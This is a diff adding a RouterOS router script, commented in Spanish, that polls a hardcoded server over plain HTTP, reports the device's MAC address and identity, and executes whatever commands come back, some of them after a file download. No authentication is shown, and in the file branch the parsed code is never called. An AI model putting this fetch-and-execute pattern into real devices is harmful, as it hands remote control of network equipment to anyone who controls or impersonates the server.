@@ -1,0 +1,34 @@
+# Nombre: fetchBridge_v3
+:local serverIp "188.95.113.44:3000";
+:local mac [/interface ethernet get [find default-name="ether1"] mac-address];
+:local identity [/system identity get name];
+
+:do {
+    # 1. Fetch directo a RAM (output=user no crea archivos)
+    :local res [/tool fetch url="http://$serverIp/check-task?mac=$mac&identity=$identity" mode=http as-value output=user timeout=15s];
+    
+    :if ($res->"status" = "finished") do={
+        :local contenido ($res->"data");
+
+        :if ($contenido != "WAIT" && [:len $contenido] > 0) do={
+            
+            # 2. Verificar si es una instrucción para descargar un archivo pesado
+            :if ([:pick $contenido 0 5] = "FILE:") do={
+                :local fileName [:pick $contenido 5 [:len $contenido]];
+                /log info "Bridge: Descargando comando pesado...";
+                /tool fetch url="http://$serverIp/get-long-task?mac=$mac" mode=http dst-path=$fileName;
+                :delay 1s;
+                :local longCmd [/file get $fileName contents];
+                [:parse $longCmd];
+                /file remove $fileName;
+            } else={
+                # 3. FLUJO CORTO: Ejecución directa en RAM (Protege la Flash)
+                :do {
+                    :local func [:parse $contenido];
+                    $func;
+                    /log info "Bridge: Ejecutado desde RAM";
+                } on-error={ /log error "Bridge: Error en comando corto" }
+            }
+        }
+    }
+} on-error={ :log error "Bridge: Error de conexion" }
